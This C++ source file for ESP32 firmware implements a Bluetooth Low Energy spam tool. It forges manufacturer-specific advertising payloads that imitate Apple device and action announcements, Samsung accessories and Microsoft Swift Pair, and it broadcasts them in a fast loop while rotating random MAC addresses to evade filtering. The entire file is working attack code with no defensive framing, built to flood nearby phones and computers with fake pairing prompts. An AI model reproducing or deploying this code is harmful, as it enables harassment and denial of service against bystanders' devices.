#include "BLESpammer.hpp"
#include <esp_random.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_gap_ble_api.h>
#include <cstring>
#include <esp_log.h>

static const char* TAG = "BLESpammer";

BLESpammer::BLESpammer() {
}

BLESpammer::~BLESpammer() {
    stopSpam();
}

void BLESpammer::init() {
    if (initialized) return;
    initialized = true;
    ESP_LOGI(TAG, "BLE Spammer Initialized (Bluedroid)");
}

void BLESpammer::generateRandomMac(uint8_t* mac) {
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    mac[0] = (r1 & 0xFF) | 0xC0; // Set top 2 bits for random static address
    mac[1] = (r1 >> 8) & 0xFF;
    mac[2] = (r1 >> 16) & 0xFF;
    mac[3] = (r1 >> 24) & 0xFF;
    mac[4] = (r2 & 0xFF);
    mac[5] = (r2 >> 8) & 0xFF;
}

void BLESpammer::buildPayload(BLEPayloadType type, uint8_t* payload, uint8_t& out_len) {
    uint8_t i = 0;
    
    switch (type) {
        case BLEPayloadType::APPLE_ACTION: {
            payload[i++] = 0x0A; // Length
            payload[i++] = 0xFF; // Manufacturer Specific
            payload[i++] = 0x4C; // Apple ID
            payload[i++] = 0x00;
            payload[i++] = 0x0F; // Type
            payload[i++] = 0x05; // Length
            payload[i++] = 0xC0; // Action Flags
            
            const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
            payload[i++] = types[esp_random() % sizeof(types)];
            
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            break;
        }
        case BLEPayloadType::APPLE_DEVICE: {
            payload[i++] = 0x14; // Length
            payload[i++] = 0xFF; // Manufacturer Specific
            payload[i++] = 0x4C; // Apple ID
            payload[i++] = 0x00;
            payload[i++] = 0x07; 
            payload[i++] = 0x0F; 
            payload[i++] = 0x00; 
            
            const uint16_t devTypes[] = {0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20, 0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620};
            uint16_t devType = devTypes[esp_random() % (sizeof(devTypes) / sizeof(devTypes[0]))];
            
            payload[i++] = (uint8_t)((devType >> 8) & 0xFF);
            payload[i++] = (uint8_t)(devType & 0xFF);
            
            payload[i++] = 0xAC; payload[i++] = 0x90; payload[i++] = 0x85;
            payload[i++] = 0x75; payload[i++] = 0x94; payload[i++] = 0x65;
            
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = (uint8_t)(esp_random() & 0xFF);
            payload[i++] = 0x00;
            break;
        }
        case BLEPayloadType::SAMSUNG: {
            payload[i++] = 14; 
            payload[i++] = 0xFF; 
            payload[i++] = 0x75; // Samsung ID
            payload[i++] = 0x00; 
            payload[i++] = 0x01; payload[i++] = 0x00; payload[i++] = 0x02;
            payload[i++] = 0x00; payload[i++] = 0x01; payload[i++] = 0x01;
            payload[i++] = 0xFF; payload[i++] = 0x00; payload[i++] = 0x00;
            payload[i++] = 0x43; 
            
            const uint8_t models[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};
            payload[i++] = models[esp_random() % sizeof(models)];
            break;
        }
        case BLEPayloadType::MICROSOFT: {
            payload[i++] = 0x06; 
            payload[i++] = 0xFF; 
            payload[i++] = 0x06; // Microsoft ID
            payload[i++] = 0x00;
            payload[i++] = 0x03; 
            payload[i++] = 0x00; 
            payload[i++] = 0x80;
            break;
        }
        default:
            // Minimal empty payload
            payload[i++] = 0x02;
            payload[i++] = 0x01;
            payload[i++] = 0x06;
            break;
    }
    
    out_len = i;
}

void BLESpammer::spamTask(void *arg) {
    BLESpammer* spammer = static_cast<BLESpammer*>(arg);
    uint8_t payload[31];
    uint8_t payload_len = 0;
    uint8_t mac[6];
    uint8_t loop_count = 0;

    while (spammer->running) {
        
        if (loop_count % 5 == 0) {
            // Stop Advertising before changing MAC
            esp_ble_gap_stop_advertising();
            vTaskDelay(pdMS_TO_TICKS(50)); // Wait for stop to complete
            
            // Randomize MAC
            spammer->generateRandomMac(mac);
            esp_ble_gap_set_rand_addr(mac);
            vTaskDelay(pdMS_TO_TICKS(10)); // Wait for MAC to apply
        }

        BLEPayloadType loopType = spammer->currentType;
        if (loopType == BLEPayloadType::ALL) {
            loopType = static_cast<BLEPayloadType>(esp_random() % static_cast<int>(BLEPayloadType::ALL));
        }

        // Build Advertising Data
        spammer->buildPayload(loopType, payload, payload_len);
        
        // Use custom raw payload
        esp_err_t rc = esp_ble_gap_config_adv_data_raw(payload, payload_len);
        if (rc != ESP_OK) {
            ESP_LOGE(TAG, "Failed to set adv data: %d", rc);
        }
        
        vTaskDelay(pdMS_TO_TICKS(10)); // Wait for raw data to apply

        // Configure Advertising parameters
        esp_ble_adv_params_t adv_params = {
            .adv_int_min       = 0x20, // 20ms
            .adv_int_max       = 0x20, // 20ms
            .adv_type          = ADV_TYPE_NONCONN_IND,
            .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
            .peer_addr         = {0, 0, 0, 0, 0, 0},
            .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
            .channel_map       = ADV_CHNL_ALL,
            .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
        };

        if (loop_count % 5 == 0) {
            // Start Advertising
            esp_ble_gap_start_advertising(&adv_params);
        }

        // Sleep to allow broadcast
        vTaskDelay(pdMS_TO_TICKS(100));
        
        loop_count++;
    }

    esp_ble_gap_stop_advertising();
    vTaskDelete(NULL);
}

void BLESpammer::startSpam(BLEPayloadType type) {
    if (running) return;
    currentType = type;
    running = true;
    xTaskCreate(spamTask, "ble_spam", 4096, this, 5, (TaskHandle_t*)&taskHandle);
    ESP_LOGI(TAG, "BLE Spam Started");
}

void BLESpammer::stopSpam() {
    if (!running) return;
    running = false;
    esp_ble_gap_stop_advertising();
    // Wait for task to exit
    vTaskDelay(pdMS_TO_TICKS(100));
    ESP_LOGI(TAG, "BLE Spam Stopped");
}
